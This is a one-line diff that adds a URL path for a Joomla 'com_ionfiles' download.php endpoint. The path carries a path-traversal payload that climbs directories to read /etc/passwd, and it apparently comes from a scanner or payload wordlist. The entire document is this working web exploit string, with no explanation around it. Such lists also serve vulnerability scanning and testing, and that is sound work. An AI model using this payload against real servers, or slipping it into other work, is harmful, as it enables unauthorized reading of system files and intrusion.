@@ -1,0 +1,1 @@
+/components/com_ionfiles/download.php?file=../../../../../../../../etc/passwd&download=1
